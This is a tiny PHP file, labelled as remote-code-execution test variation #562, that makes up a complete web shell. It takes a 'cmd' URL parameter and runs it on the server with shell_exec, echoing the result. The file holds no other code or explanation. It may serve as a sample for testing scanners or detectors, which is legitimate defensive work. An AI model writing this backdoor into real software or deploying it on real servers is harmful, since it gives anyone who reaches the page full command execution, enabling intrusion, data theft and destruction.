<?php
// RCE test variation #562
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>